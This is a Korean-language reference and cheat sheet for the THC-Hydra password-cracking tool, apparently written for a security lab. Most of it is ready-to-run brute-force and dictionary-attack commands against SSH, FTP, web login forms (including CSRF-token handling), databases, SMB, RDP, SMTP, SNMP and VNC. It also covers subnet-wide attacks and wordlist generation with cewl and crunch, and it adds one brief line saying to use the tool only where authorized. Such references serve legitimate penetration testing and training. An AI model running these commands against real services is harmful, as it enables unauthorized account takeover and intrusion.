# hydra 패스워드 크래킹 레퍼런스

## 개요

hydra(THC-Hydra)는 네트워크 서비스에 대한 온라인 패스워드 브루트포스/사전 공격 도구이다. 50개 이상의 프로토콜을 지원하며, 병렬 처리로 빠른 크래킹을 수행한다.

---

## 1. 기본 문법

```bash
hydra [옵션] <대상> <프로토콜>
```

### 인증 정보 지정

| 옵션 | 설명                        | 예시                         |
|------|-----------------------------|------------------------------|
| `-l` | 단일 사용자명               | `-l admin`                   |
| `-L` | 사용자명 파일               | `-L users.txt`               |
| `-p` | 단일 패스워드               | `-p password123`             |
| `-P` | 패스워드 파일               | `-P rockyou.txt`             |
| `-C` | 콜론 구분 자격 증명 파일    | `-C creds.txt` (user:pass)   |
| `-e` | 추가 패스워드 체크          | `-e nsr`                     |
| `-x` | 패스워드 생성 (브루트포스)  | `-x 4:8:aA1` (4~8자, 영숫자)|

### -e 옵션 상세

| 값  | 설명                          |
|-----|-------------------------------|
| `n` | null 패스워드 시도            |
| `s` | 사용자명과 동일한 패스워드   |
| `r` | 사용자명 역순 패스워드       |

```bash
# 빈 패스워드 + 사용자명=패스워드 + 역순 먼저 시도
hydra -l admin -P passwords.txt -e nsr 10.20.30.10 ssh
```

---

## 2. 주요 옵션

| 옵션       | 설명                                    | 기본값 |
|------------|-----------------------------------------|--------|
| `-t`       | 병렬 태스크 수                          | 16     |
| `-w`       | 응답 대기 시간 (초)                     | 32     |
| `-W`       | 연결 간 대기 시간 (초)                  | 0      |
| `-f`       | 첫 번째 성공 시 전체 중단               | —      |
| `-F`       | 첫 번째 성공 시 호스트별 중단           | —      |
| `-V`       | 각 시도 출력 (verbose)                  | —      |
| `-v`       | 상세 출력                               | —      |
| `-d`       | 디버그 모드                             | —      |
| `-o`       | 결과 출력 파일                          | —      |
| `-b`       | 출력 형식 (text/json/jsonv1)            | text   |
| `-R`       | 이전 세션 복원 (재시작)                 | —      |
| `-s`       | 포트 번호 지정                          | —      |
| `-S`       | SSL 연결                                | —      |
| `-O`       | 구버전 SSL 사용                         | —      |
| `-M`       | 대상 목록 파일                          | —      |
| `-I`       | 이전 세션 무시 (새로 시작)              | —      |
| `-4` / `-6`| IPv4 / IPv6 강제                        | —      |

---

## 3. 지원 프로토콜 및 사용법

### SSH

```bash
# 단일 사용자 + 패스워드 파일
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  10.20.30.10 ssh

# 비표준 포트
hydra -l admin -P passwords.txt -s 2222 10.20.30.10 ssh

# 스레드 제한 (SSH는 동시 연결 제한 있음)
hydra -l admin -P passwords.txt -t 4 10.20.30.10 ssh
```

### FTP

```bash
hydra -L users.txt -P passwords.txt 10.20.30.10 ftp

# 익명 FTP 체크
hydra -l anonymous -p "" 10.20.30.10 ftp
```

### HTTP Basic Auth

```bash
# HTTP GET Basic 인증
hydra -l admin -P passwords.txt \
  10.20.30.10 http-get /admin/

# HTTPS
hydra -l admin -P passwords.txt -S -s 443 \
  10.20.30.10 https-get /admin/
```

### HTTP POST 폼 (가장 많이 사용)

```bash
# 문법: http-post-form "URL:BODY:실패문자열"
hydra -l admin -P passwords.txt \
  10.20.30.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTPS POST 폼
hydra -l admin -P passwords.txt -S -s 443 \
  10.20.30.10 https-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# 쿠키 포함
hydra -l admin -P passwords.txt \
  10.20.30.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Login failed:H=Cookie: PHPSESSID=abc123"

# 성공 조건 사용 (S=)
hydra -l admin -P passwords.txt \
  10.20.30.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:S=Dashboard"

# CSRF 토큰 포함 (정규식으로 추출)
hydra -l admin -P passwords.txt \
  10.20.30.10 http-post-form \
  "/login:username=^USER^&password=^PASS^&token=^TOKEN^:F=Invalid:H=Cookie: session=abc:^TOKEN^=name=\"csrf_token\" value=\"([^\"]*)\""
```

### HTTP POST 폼 파라미터 설명

| 플레이스홀더 | 설명                           |
|-------------|--------------------------------|
| `^USER^`    | 사용자명으로 대체              |
| `^PASS^`    | 패스워드로 대체                |
| `^TOKEN^`   | 자동 추출된 토큰 값            |
| `F=`        | 실패 조건 문자열               |
| `S=`        | 성공 조건 문자열               |
| `H=`        | 추가 헤더                      |
| `C=`        | 쿠키 URL (토큰 페이지)        |

### MySQL

```bash
hydra -l root -P passwords.txt 10.20.30.10 mysql
```

### PostgreSQL

```bash
hydra -l postgres -P passwords.txt 10.20.30.10 postgres
```

### SMB

```bash
hydra -l administrator -P passwords.txt 10.20.30.10 smb
```

### RDP

```bash
hydra -l administrator -P passwords.txt 10.20.30.10 rdp
```

### SMTP

```bash
hydra -l user@domain.com -P passwords.txt 10.20.30.10 smtp
```

### Telnet

```bash
hydra -l admin -P passwords.txt 10.20.30.10 telnet
```

### SNMP

```bash
# SNMP 커뮤니티 문자열 브루트포스
hydra -P community_strings.txt 10.20.30.10 snmp
```

### VNC

```bash
# VNC는 사용자명 없음
hydra -P passwords.txt 10.20.30.10 vnc
```

---

## 4. 패스워드 생성 (-x)

```bash
# 문법: -x min:max:charset
# charset: a=소문자, A=대문자, 1=숫자, 특수문자는 직접 지정

# 4~6자 소문자+숫자
hydra -l admin -x 4:6:a1 10.20.30.10 ssh

# 6~8자 영숫자+특수문자
hydra -l admin -x "6:8:aA1!@#$" 10.20.30.10 ssh

# 정확히 4자리 숫자 (PIN)
hydra -l admin -x 4:4:1 10.20.30.10 ssh
```

---

## 5. 다중 대상

```bash
# 대상 목록 파일
hydra -L users.txt -P passwords.txt -M targets.txt ssh

# targets.txt 내용:
# 10.20.30.10
# 10.20.30.11
# 10.20.30.12

# CIDR 범위 (일부 버전)
hydra -l admin -P passwords.txt 10.20.30.0/24 ssh
```

---

## 6. 결과 저장 및 복원

```bash
# 결과 파일 저장
hydra -l admin -P passwords.txt 10.20.30.10 ssh -o results.txt

# JSON 출력
hydra -l admin -P passwords.txt 10.20.30.10 ssh -o results.json -b json

# 중단된 세션 복원
hydra -R

# 이전 세션 무시하고 새로 시작
hydra -l admin -P passwords.txt 10.20.30.10 ssh -I
```

---

## 7. 실습 예제

### 예제 1: SSH 크래킹

```bash
# 일반적인 사용자명으로 SSH 브루트포스
cat > users.txt << 'EOF'
root
admin
user
ubuntu
deploy
EOF

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  -t 4 -f -V \
  10.20.30.10 ssh
```

### 예제 2: 웹 로그인 폼 크래킹

```bash
# 1. 먼저 로그인 페이지 분석 (폼 필드 확인)
# username, password 필드, 실패 시 "Invalid" 메시지

hydra -l admin -P /usr/share/wordlists/common_passwords.txt \
  -t 10 -f -V \
  10.20.30.10 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid"
```

### 예제 3: FTP 익명 + 기본 자격 증명 확인

```bash
# 기본 자격 증명 파일
cat > ftp_creds.txt << 'EOF'
anonymous:
ftp:ftp
admin:admin
admin:password
root:root
EOF

hydra -C ftp_creds.txt -f 10.20.30.10 ftp
```

### 예제 4: 여러 서비스 순차 테스트

```bash
# SSH
hydra -l admin -P passwords.txt -t 4 -f 10.20.30.10 ssh -o ssh_results.txt

# FTP
hydra -l admin -P passwords.txt -t 4 -f 10.20.30.10 ftp -o ftp_results.txt

# MySQL
hydra -l root -P passwords.txt -t 4 -f 10.20.30.10 mysql -o mysql_results.txt
```

---

## 8. 주의사항

```
- hydra는 공격 도구이므로 반드시 허가된 환경에서만 사용
- SSH는 동시 연결 수를 제한하므로 -t 4 이하 권장
- 계정 잠금 정책이 있는 경우 -W 옵션으로 대기 시간 설정
- 대용량 사전 파일 사용 시 -f 옵션으로 첫 성공 시 중단
- VPN/프록시 환경에서는 -w 타임아웃을 넉넉하게 설정
- 결과는 항상 -o 옵션으로 저장
```

---

## 9. 워드리스트 경로 (Kali/CCC)

```bash
# 기본 워드리스트
/usr/share/wordlists/rockyou.txt          # 대형 사전 (14M 항목)
/usr/share/wordlists/dirb/common.txt      # 웹 디렉토리
/usr/share/seclists/Passwords/            # SecLists 패스워드

# 커스텀 워드리스트 생성 (cewl)
cewl http://10.20.30.10 -d 3 -m 6 -w custom_wordlist.txt

# 커스텀 워드리스트 생성 (crunch)
crunch 4 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
```

---

## 참고

- 공식 GitHub: https://github.com/vanhauser-thc/thc-hydra
- 도움말: `hydra -h`
- 지원 프로토콜 목록: `hydra -U http-post-form` (프로토콜별 상세)
